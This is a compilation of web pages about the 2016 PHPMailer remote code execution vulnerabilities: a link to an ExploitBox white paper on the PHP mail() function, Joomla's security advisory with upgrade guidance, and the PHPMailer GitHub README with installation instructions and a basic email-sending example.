ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)
[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

```


=== Content from legalhackers.com_3fd44ba6_20250126_062411.html ===


[## **[white-paper] Pwning PHP mail() function For Fun And Remote Code Execution**

# (New Exploitation Techniques And Vectors - i.e what's been missed so far)](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

### by **Dawid Golunski** <https://legalhackers.com>

[Follow @dawid\_golunski](https://twitter.com/dawid_golunski)

 **[<-- Back To legalhackers.com](https://legalhackers.com)**



=== Content from developer.joomla.org_04fe7646_20250125_054104.html ===


* Joomla!®
  + About us
  + [Joomla Home](https://www.joomla.org)
  + [What is Joomla?](https://www.joomla.org/about-joomla.html)
  + [Benefits & Features](https://www.joomla.org/core-features.html)
  + [Project & Leadership](https://www.joomla.org/about-joomla/the-project.html)
  + [Trademark & Licensing](https://tm.joomla.org)
  + [The Joomla Foundation](https://joomlafoundation.org)
  + Support us
  + [Contribute](https://www.joomla.org/contribute-to-joomla.html)
  + [Sponsor](https://www.joomla.org/sponsor.html)
  + [Partner](https://www.joomla.org/about-joomla/partners.html)
  + [Shop](https://shop.joomla.org)
* Download & Extend
  + [Downloads](https://downloads.joomla.org)
  + [Extensions](https://extensions.joomla.org)
  + [Languages](https://community.joomla.org/translations.html)
  + [Get a free site](https://launch.joomla.org)
  + [Get a domain](https://domains.joomla.org)
* Discover & Learn
  + [Documentation](https://docs.joomla.org)
  + [Training](https://community.joomla.org/joomla-training.html)
  + [Certification](https://certification.joomla.org)
  + [Site Showcase](https://showcase.joomla.org)
  + [Announcements](https://www.joomla.org/announcements.html)
  + [Blogs](https://community.joomla.org/blogs.html)
  + [Magazine](https://magazine.joomla.org)
* Community & Support
  + [Community Portal](https://community.joomla.org)
  + [Events](https://community.joomla.org/events.html)
  + [User Groups](https://community.joomla.org/user-groups.html)
  + [Forum](https://forum.joomla.org)
  + [Service Providers Directory](https://community.joomla.org/service-providers-directory.html)
  + [Volunteers Portal](https://volunteers.joomla.org)
  + [Vulnerable Extensions List](https://extensions.joomla.org/vulnerable-extensions/vulnerable/)
* Developer Resources
  + [Developer Network](https://developer.joomla.org)
  + [Security Centre](https://developer.joomla.org/security.html)
  + [Issue Tracker](https://issues.joomla.org)
  + [GitHub](https://github.com/joomla)
  + [API Documentation](https://api.joomla.org)
  + [Joomla! Framework](https://framework.joomla.org)

Search

# [Joomla! Developer Network™](/)

[Download](https://downloads.joomla.org/)

[Launch](https://launch.joomla.org)

* [Home](/)
* [News](/news.html)
* [Project Roadmap](/roadmap.html)
* [CMS](/cms.html)
* [Framework](/framework.html)
* [Tracker](/tracker.html)
* [About](/about.html)
* [Security](/security.html)

# Security Announcements

## [20161205] - PHPMailer Security Advisory

* **Project:** Joomla!
* **Severity:** High
* **Versions:** 1.5.0 through 3.6.5
* **Exploit type:** Remote Code Execution in third-party PHPMailer library
* **CVE Numbers:** [CVE-2016-10033](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10033) and [CVE-2016-10045](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10045)

**Note:** This advisory was revised to reflect the addition of CVE-2016-10045 and the PHPMailer 5.2.20 release
### Description

All versions of the third-party PHPMailer library distributed with Joomla! versions up to 3.6.5 are vulnerable to a remote code execution vulnerability. This is patched in PHPMailer 5.2.20 which will be included with Joomla! 3.7. After analysis, the JSST has determined that through correct use of the JMail class, there are additional validations in place which make executing this vulnerability impractical within the Joomla environment. As well, the vulnerability requires being able to pass user input to a message's "from" address; all places in the core Joomla API which send mail use the sender address set in the global configuration and does not allow for user input to be set elsewhere. However, extensions which bundle a separate version of PHPMailer or do not use the Joomla API to send email may be vulnerable to this issue.

Generally, the Joomla project does not issue advisories regarding third party libraries, however given the severity of this issue we felt it important to advise our users that we are aware of this issue and we have determined that the additional validations in our API prevent triggering this vulnerability.

### Affected Installs

Joomla! CMS versions 1.5.0 through 3.6.5

### Solution

No action required for Joomla users, the updated library will be included in the next scheduled release and additional mechanisms exist in Joomla core to prevent triggering the vulnerability. Users of the PHPMailer library separate from Joomla are advised to upgrade to 5.2.20 or newer ASAP.

### Additional Resources

* <https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>
* <https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>
* <https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md>
* <https://github.com/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities>

### Contact

The JSST at the [Joomla! Security Centre](/security-centre.html "Contact the JSST").

**Reported By:** Dawid Golunski
[Previous article: [20170401] - Core - Information Disclosure
 Prev](/security-centre/683-20170401-core-information-disclosure.html)
[Next article: [20161204] - Misc. Security Hardening
Next](/security-centre/667-20161204-misc-security-hardening.html)

1. You are here:
2. [Home](/)
3. [Security Announcements](/security-centre.html)
4. [20161205] - PHPMailer Security Advisory

### Joomla! CMS

* [Current Release ![Joomla! CMS 3](/images/joomla-logo.png)](https://downloads.joomla.org/latest)
* [View known Issues](https://issues.joomla.org)
* [Development Status](https://github.com/joomla/joomla-cms#build-status)
* [Download Nightly builds](/nightly-builds.html)

### Joomla! Framework

* [Current Release ![Joomla! Framework Logo](/images/joomla-framework.png) 2**.x**](https://framework.joomla.org)
* [Development Status](https://framework.joomla.org/status)

### Resources

* [Development Strategy](/development-strategy.html)
* [Security Announcements](/security-centre.html)
* [Report Security Issues](/security/contact-the-team.html)
* [Usage Statistics](/about/stats.html)
* [Statistics API Documentation](/about/stats/api.html)
* [Joomla! API Documentation](https://api.joomla.org)
* [Coding Standards Manual](/coding-standards.html)
* [JoomlaCode Archive](/joomlacode-archive.html)

### Mailing Lists

* [Developer Network Newsletter](https://community.joomla.org/joomla-developer-network-newsletter.html)
* [General Extensions Mailing](https://groups.google.com/group/joomla-dev-general)
* [CMS Mailing](https://groups.google.com/group/joomla-dev-cms)
* [Framework Mailing](https://groups.google.com/group/joomla-dev-framework)
* [Documentation Mailing](https://groups.google.com/group/joomla-docs)

---

* [Joomla! on Twitter](https://twitter.com/joomla "Joomla! on Twitter")
* [Joomla! on Facebook](https://www.facebook.com/joomla "Joomla! on Facebook")
* [Joomla! on YouTube](https://www.youtube.com/user/joomla "Joomla! on YouTube")
* [Joomla! on LinkedIn](https://www.linkedin.com/company/joomla "Joomla! on LinkedIn")
* [Joomla! on Pinterest](https://www.pinterest.com/joomla "Joomla! on Pinterest")
* [Joomla! on Instagram](https://www.instagram.com/joomlaofficial/ "Joomla! on Instagram")
* [Joomla! on GitHub](https://github.com/joomla "Joomla! on GitHub")

* [Home](https://www.joomla.org)
* [About](https://www.joomla.org/about-joomla.html)
* [Community](https://community.joomla.org)
* [Forum](https://forum.joomla.org)
* [Extensions](https://extensions.joomla.org)
* [Services](https://community.joomla.org/service-providers-directory.html)
* [Docs](https://docs.joomla.org)
* [Developer](https://developer.joomla.org)
* [Shop](https://community.joomla.org/the-joomla-shop.html)

* [Accessibility Statement](https://www.joomla.org/accessibility-statement.html)
* [Privacy Policy](https://www.joomla.org/privacy-policy.html)
* [Cookie Policy](https://www.joomla.org/cookie-policy.html)
* [Sponsor Joomla! with $5](https://community.joomla.org/sponsorship-campaigns.html)
* [Help Translate](https://joomla.crowdin.com)
* [Report an Issue](https://github.com/joomla/joomla-websites/issues/new?title=[jdev]%20&body=Please%20describe%20the%20problem%20or%20your%20issue)
* [Log in](/component/content/article/668-20161205-phpmailer-security-advisory.html?layout=blog&Itemid=&catid=13)

© 2005 - 2025 [Open Source Matters, Inc.](https://opensourcematters.org) All Rights Reserved.

[![Rochen](https://cdn.joomla.org/rochen/rochen_footer_logo_white.svg)](https://www.rochen.com/joomla-hosting)
[Joomla! Hosting by Rochen](https://www.rochen.com/joomla-hosting)

Close

We have detected that you are using an ad blocker. The Joomla! Project relies on revenue from these advertisements so please consider disabling the ad blocker for this domain.



=== Content from github.com_9b75dead_20250126_062518.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=PHPMailer%2FPHPMailer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[PHPMailer](/PHPMailer)
/
**[PHPMailer](/PHPMailer/PHPMailer)**
Public

* [Notifications](/login?return_to=%2FPHPMailer%2FPHPMailer) You must be signed in to change notification settings
* [Fork
  9.7k](/login?return_to=%2FPHPMailer%2FPHPMailer)
* [Star
   21.2k](/login?return_to=%2FPHPMailer%2FPHPMailer)

The classic email sending library for PHP

### License

[LGPL-2.1 license](/PHPMailer/PHPMailer/blob/master/LICENSE)

[21.2k
stars](/PHPMailer/PHPMailer/stargazers) [9.7k
forks](/PHPMailer/PHPMailer/forks) [Branches](/PHPMailer/PHPMailer/branches) [Tags](/PHPMailer/PHPMailer/tags) [Activity](/PHPMailer/PHPMailer/activity)
 [Star](/login?return_to=%2FPHPMailer%2FPHPMailer)

 [Notifications](/login?return_to=%2FPHPMailer%2FPHPMailer) You must be signed in to change notification settings

* [Code](/PHPMailer/PHPMailer)
* [Issues
  36](/PHPMailer/PHPMailer/issues)
* [Pull requests
  11](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects
  0](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

Additional navigation options

* [Code](/PHPMailer/PHPMailer)
* [Issues](/PHPMailer/PHPMailer/issues)
* [Pull requests](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

# PHPMailer/PHPMailer

    master[Branches](/PHPMailer/PHPMailer/branches)[Tags](/PHPMailer/PHPMailer/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[2,454 Commits](/PHPMailer/PHPMailer/commits/master/) | | |
| [.github](/PHPMailer/PHPMailer/tree/master/.github ".github") | | [.github](/PHPMailer/PHPMailer/tree/master/.github ".github") |  |  |
| [.phan](/PHPMailer/PHPMailer/tree/master/.phan ".phan") | | [.phan](/PHPMailer/PHPMailer/tree/master/.phan ".phan") |  |  |
| [docs](/PHPMailer/PHPMailer/tree/master/docs "docs") | | [docs](/PHPMailer/PHPMailer/tree/master/docs "docs") |  |  |
| [examples](/PHPMailer/PHPMailer/tree/master/examples "examples") | | [examples](/PHPMailer/PHPMailer/tree/master/examples "examples") |  |  |
| [language](/PHPMailer/PHPMailer/tree/master/language "language") | | [language](/PHPMailer/PHPMailer/tree/master/language "language") |  |  |
| [src](/PHPMailer/PHPMailer/tree/master/src "src") | | [src](/PHPMailer/PHPMailer/tree/master/src "src") |  |  |
| [test](/PHPMailer/PHPMailer/tree/master/test "test") | | [test](/PHPMailer/PHPMailer/tree/master/test "test") |  |  |
| [.codecov.yml](/PHPMailer/PHPMailer/blob/master/.codecov.yml ".codecov.yml") | | [.codecov.yml](/PHPMailer/PHPMailer/blob/master/.codecov.yml ".codecov.yml") |  |  |
| [.editorconfig](/PHPMailer/PHPMailer/blob/master/.editorconfig ".editorconfig") | | [.editorconfig](/PHPMailer/PHPMailer/blob/master/.editorconfig ".editorconfig") |  |  |
| [.gitattributes](/PHPMailer/PHPMailer/blob/master/.gitattributes ".gitattributes") | | [.gitattributes](/PHPMailer/PHPMailer/blob/master/.gitattributes ".gitattributes") |  |  |
| [.gitignore](/PHPMailer/PHPMailer/blob/master/.gitignore ".gitignore") | | [.gitignore](/PHPMailer/PHPMailer/blob/master/.gitignore ".gitignore") |  |  |
| [COMMITMENT](/PHPMailer/PHPMailer/blob/master/COMMITMENT "COMMITMENT") | | [COMMITMENT](/PHPMailer/PHPMailer/blob/master/COMMITMENT "COMMITMENT") |  |  |
| [LICENSE](/PHPMailer/PHPMailer/blob/master/LICENSE "LICENSE") | | [LICENSE](/PHPMailer/PHPMailer/blob/master/LICENSE "LICENSE") |  |  |
| [README.md](/PHPMailer/PHPMailer/blob/master/README.md "README.md") | | [README.md](/PHPMailer/PHPMailer/blob/master/README.md "README.md") |  |  |
| [SECURITY.md](/PHPMailer/PHPMailer/blob/master/SECURITY.md "SECURITY.md") | | [SECURITY.md](/PHPMailer/PHPMailer/blob/master/SECURITY.md "SECURITY.md") |  |  |
| [UPGRADING.md](/PHPMailer/PHPMailer/blob/master/UPGRADING.md "UPGRADING.md") | | [UPGRADING.md](/PHPMailer/PHPMailer/blob/master/UPGRADING.md "UPGRADING.md") |  |  |
| [VERSION](/PHPMailer/PHPMailer/blob/master/VERSION "VERSION") | | [VERSION](/PHPMailer/PHPMailer/blob/master/VERSION "VERSION") |  |  |
| [changelog.md](/PHPMailer/PHPMailer/blob/master/changelog.md "changelog.md") | | [changelog.md](/PHPMailer/PHPMailer/blob/master/changelog.md "changelog.md") |  |  |
| [composer.json](/PHPMailer/PHPMailer/blob/master/composer.json "composer.json") | | [composer.json](/PHPMailer/PHPMailer/blob/master/composer.json "composer.json") |  |  |
| [get\_oauth\_token.php](/PHPMailer/PHPMailer/blob/master/get_oauth_token.php "get_oauth_token.php") | | [get\_oauth\_token.php](/PHPMailer/PHPMailer/blob/master/get_oauth_token.php "get_oauth_token.php") |  |  |
| [phpcs.xml.dist](/PHPMailer/PHPMailer/blob/master/phpcs.xml.dist "phpcs.xml.dist") | | [phpcs.xml.dist](/PHPMailer/PHPMailer/blob/master/phpcs.xml.dist "phpcs.xml.dist") |  |  |
| [phpdoc.dist.xml](/PHPMailer/PHPMailer/blob/master/phpdoc.dist.xml "phpdoc.dist.xml") | | [phpdoc.dist.xml](/PHPMailer/PHPMailer/blob/master/phpdoc.dist.xml "phpdoc.dist.xml") |  |  |
| [phpunit.xml.dist](/PHPMailer/PHPMailer/blob/master/phpunit.xml.dist "phpunit.xml.dist") | | [phpunit.xml.dist](/PHPMailer/PHPMailer/blob/master/phpunit.xml.dist "phpunit.xml.dist") |  |  |
| View all files | | |

## Repository files navigation

* README
* LGPL-2.1 license
* Security

[![SWUbanner](https://raw.githubusercontent.com/vshymanskyy/StandWithUkraine/main/banner2-direct.svg)](https://supportukrainenow.org/)

[![PHPMailer](https://camo.githubusercontent.com/6d4a0a8d2ca2b19852106a326edc638c302cb7a4bfa3300f83993f5c278762ff/68747470733a2f2f7261772e6769746875622e636f6d2f5048504d61696c65722f5048504d61696c65722f6d61737465722f6578616d706c65732f696d616765732f7068706d61696c65722e706e67)](https://camo.githubusercontent.com/6d4a0a8d2ca2b19852106a326edc638c302cb7a4bfa3300f83993f5c278762ff/68747470733a2f2f7261772e6769746875622e636f6d2f5048504d61696c65722f5048504d61696c65722f6d61737465722f6578616d706c65732f696d616765732f7068706d61696c65722e706e67)

# PHPMailer – A full-featured email creation and transfer class for PHP

[![Test status](https://github.com/PHPMailer/PHPMailer/workflows/Tests/badge.svg)](https://github.com/PHPMailer/PHPMailer/actions)
[![codecov.io](https://camo.githubusercontent.com/e8d290abf582d18a91f9275e33b7b4e878742877f72440f283439389073702b5/68747470733a2f2f636f6465636f762e696f2f67682f5048504d61696c65722f5048504d61696c65722f6272616e63682f6d61737465722f67726170682f62616467652e7376673f746f6b656e3d694f525a70776d596d4d)](https://codecov.io/gh/PHPMailer/PHPMailer)
[![Latest Stable Version](https://camo.githubusercontent.com/082a4b469d55b1af070c588210496a9bd0497cb883cbca19dfeaed441e711fab/68747470733a2f2f706f7365722e707567782e6f72672f7068706d61696c65722f7068706d61696c65722f762f737461626c652e737667)](https://packagist.org/packages/phpmailer/phpmailer)
[![Total Downloads](https://camo.githubusercontent.com/b56a00b49d58b84a7b4056742b90914f23635008ec6ed5a067ee975ff815af6c/68747470733a2f2f706f7365722e707567782e6f72672f7068706d61696c65722f7068706d61696c65722f646f776e6c6f616473)](https://packagist.org/packages/phpmailer/phpmailer)
[![License](https://camo.githubusercontent.com/12c0c395cd01dd2fb0aec76e0000c8eb6a0fd6f7b65f9f52b0dbd6f289e60fd3/68747470733a2f2f706f7365722e707567782e6f72672f7068706d61696c65722f7068706d61696c65722f6c6963656e73652e737667)](https://packagist.org/packages/phpmailer/phpmailer)
[![API Docs](https://github.com/phpmailer/phpmailer/workflows/Docs/badge.svg)](https://phpmailer.github.io/PHPMailer/)
[![OpenSSF Scorecard](https://camo.githubusercontent.com/e3aec1b3bdc455e8617e3e3d97c4a3dada7b95dc97106a46b9c2ac1dfd6cdd7f/68747470733a2f2f6170692e736563757269747973636f726563617264732e6465762f70726f6a656374732f6769746875622e636f6d2f5048504d61696c65722f5048504d61696c65722f6261646765)](https://api.securityscorecards.dev/projects/github.com/PHPMailer/PHPMailer)

## Features

* Probably the world's most popular code for sending email from PHP!
* Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii, Joomla! and many more
* Integrated SMTP support – send without a local mail server
* Send emails with multiple To, CC, BCC, and Reply-to addresses
* Multipart/alternative emails for mail clients that do not read HTML email
* Add attachments, including inline
* Support for UTF-8 content and 8bit, base64, binary, and quoted-printable encodings
* SMTP authentication with LOGIN, PLAIN, CRAM-MD5, and XOAUTH2 mechanisms over SMTPS and SMTP+STARTTLS transports
* Validates email addresses automatically
* Protects against header injection attacks
* Error messages in over 50 languages!
* DKIM and S/MIME signing support
* Compatible with PHP 5.5 and later, including PHP 8.2
* Namespaced to prevent name clashes
* Much more!

## Why you might need it

Many PHP developers need to send email from their code. The only PHP function that supports this directly is [`mail()`](https://www.php.net/manual/en/function.mail.php). However, it does not provide any assistance for making use of popular features such as encryption, authentication, HTML messages, and attachments.

Formatting email correctly is surprisingly difficult. There are myriad overlapping (and conflicting) standards, requiring tight adherence to horribly complicated formatting and encoding rules – the vast majority of code that you'll find online that uses the `mail()` function directly is just plain wrong, if not unsafe!

The PHP `mail()` function usually sends via a local mail server, typically fronted by a `sendmail` binary on Linux, BSD, and macOS platforms, however, Windows usually doesn't include a local mail server; PHPMailer's integrated SMTP client allows email sending on all platforms without needing a local mail server. Be aware though, that the `mail()` function should be avoided when possible; it's both faster and [safer](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html) to use SMTP to localhost.

*Please* don't be tempted to do it yourself – if you don't use PHPMailer, there are many other excellent libraries that
you should look at before rolling your own. Try [SwiftMailer](https://swiftmailer.symfony.com/)
, [Laminas/Mail](https://docs.laminas.dev/laminas-mail/), [ZetaComponents](https://github.com/zetacomponents/Mail), etc.

## License

This software is distributed under the [LGPL 2.1](https://www.gnu.org/licenses/old-licenses/lgpl-2.1.html) license, along with the [GPL Cooperation Commitment](https://gplcc.github.io/gplcc/). Please read [LICENSE](https://github.com/PHPMailer/PHPMailer/blob/master/LICENSE) for information on the software availability and distribution.

## Installation & loading

PHPMailer is available on [Packagist](https://packagist.org/packages/phpmailer/phpmailer) (using semantic versioning), and installation via [Composer](https://getcomposer.org) is the recommended way to install PHPMailer. Just add this line to your `composer.json` file:

```
"phpmailer/phpmailer": "^6.9.2"
```

or run

```
composer require phpmailer/phpmailer
```

Note that the `vendor` folder and the `vendor/autoload.php` script are generated by Composer; they are not part of PHPMailer.

If you want to use XOAUTH2 authentication, you will also need to add a dependency on the `league/oauth2-client` and appropriate service adapters package in your `composer.json`, or take a look at
by @decomplexity's [SendOauth2 wrapper](https://github.com/decomplexity/SendOauth2), especially if you're using Microsoft services.

Alternatively, if you're not using Composer, you
can [download PHPMailer as a zip file](https://github.com/PHPMailer/PHPMailer/archive/master.zip), (note that docs and examples are not included in the zip file), then copy the contents of the PHPMailer folder into one of the `include_path` directories specified in your PHP configuration and load each class file manually:

```
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';
```

If you're not using the `SMTP` class explicitly (you're probably not), you don't need a `use` line for the SMTP class. Even if you're not using exceptions, you do still need to load the `Exception` class as it is used internally.

## Legacy versions

PHPMailer 5.2 (which is compatible with PHP 5.0 — 7.0) is no longer supported, even for security updates. You will find the latest version of 5.2 in the [5.2-stable branch](https://github.com/PHPMailer/PHPMailer/tree/5.2-stable). If you're using PHP 5.5 or later (which you should be), switch to the 6.x releases.

### Upgrading from 5.2

The biggest changes are that source files are now in the `src/` folder, and PHPMailer now declares the namespace `PHPMailer\PHPMailer`. This has several important effects – [read the upgrade guide](https://github.com/PHPMailer/PHPMailer/tree/master/UPGRADING.md) for more details.

### Minimal installation

While installing the entire package manually or with Composer is simple, convenient, and reliable, you may want to include only vital files in your project. At the very least you will need [src/PHPMailer.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/PHPMailer.php). If you're using SMTP, you'll need [src/SMTP.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/SMTP.php), and if you're using POP-before SMTP (*very* unlikely!), you'll need [src/POP3.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/POP3.php). You can skip the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder if you're not showing errors to users and can make do with English-only errors. If you're using XOAUTH2 you will need [src/OAuth.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/OAuth.php) as well as the Composer dependencies for the services you wish to authenticate with. Really, it's much easier to use Composer!

## A Simple Example

```
<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.example.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'user@example.com';                     //SMTP username
    $mail->Password   = 'secret';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('from@example.com', 'Mailer');
    $mail->addAddress('joe@example.net', 'Joe User');     //Add a recipient
    $mail->addAddress('ellen@example.com');               //Name is optional
    $mail->addReplyTo('info@example.com', 'Information');
    $mail->addCC('cc@example.com');
    $mail->addBCC('bcc@example.com');

    //Attachments
    $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Here is the subject';
    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
```

You'll find plenty to play with in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder, which covers many common scenarios including sending through Gmail, building contact forms, sending to mailing lists, and more.

If you are re-using the instance (e.g. when sending to a mailing list), you may need to clear the recipient list to avoid sending duplicate messages. See [the mailing list example](https://github.com/PHPMailer/PHPMailer/blob/master/examples/mailing_list.phps) for further guidance.

That's it. You should now be ready to use PHPMailer!

## Localization

PHPMailer defaults to English, but in the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder, you'll find many translations for PHPMailer error messages that you may encounter. Their filenames contain [ISO 639-1](https://en.wikipedia.org/wiki/ISO_639-1) language code for the translations, for example `fr` for French. To specify a language, you need to tell PHPMailer which one to use, like this:

```
//To load the French version
$mail->setLanguage('fr', '/optional/path/to/language/directory/');
```

We welcome corrections and new languages – if you're looking for corrections, run the [Language/TranslationCompletenessTest.php](https://github.com/PHPMailer/PHPMailer/blob/master/test/Language/TranslationCompletenessTest.php) script in the tests folder and it will show any missing translations.

## Documentation

Start reading at the [GitHub wiki](https://github.com/PHPMailer/PHPMailer/wiki). If you're having trouble, head for [the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting) as it's frequently updated.

Examples of how to use PHPMailer for common scenarios can be found in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder. If you're looking for a good starting point, we recommend you start with [the Gmail example](https://github.com/PHPMailer/PHPMailer/tree/master/examples/gmail.phps).

To reduce PHPMailer's deployed code footprint, examples are not included if you load PHPMailer via Composer or via [GitHub's zip file download](https://github.com/PHPMailer/PHPMailer/archive/master.zip), so you'll need to either clone the git repository or use the above links to get to the examples directly.

Complete generated API documentation is [available online](https://phpmailer.github.io/PHPMailer/).

You can generate complete API-level documentation by running `phpdoc` in the top-level folder, and documentation will appear in the `docs` folder, though you'll need to have [PHPDocumentor](https://www.phpdoc.org) installed. You may find [the unit tests](https://github.com/PHPMailer/PHPMailer/blob/master/test/PHPMailer/PHPMailerTest.php) a good reference for how to do various operations such as encryption.

If the documentation doesn't cover what you need, search the [many questions on Stack Overflow](https://stackoverflow.com/questions/tagged/phpmailer), and before you ask a question about "SMTP Error: Could not connect to SMTP host.", [read the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting).

## Tests

[PHPMailer tests](https://github.com/PHPMailer/PHPMailer/tree/master/test/) use PHPUnit 9, with [a polyfill](https://github.com/Yoast/PHPUnit-Polyfills) to let 9-style tests run on older PHPUnit and PHP versions.

[![Test status](https://github.com/PHPMailer/PHPMailer/workflows/Tests/badge.svg)](https://github.com/PHPMailer/PHPMailer/actions)

If this isn't passing, is there something you can do to help?

## Security

Please disclose any vulnerabilities found responsibly – report security issues to the maintainers privately.

See [SECURITY](https://github.com/PHPMailer/PHPMailer/tree/master/SECURITY.md) and [PHPMailer's security advisories on GitHub](https://github.com/PHPMailer/PHPMailer/security).

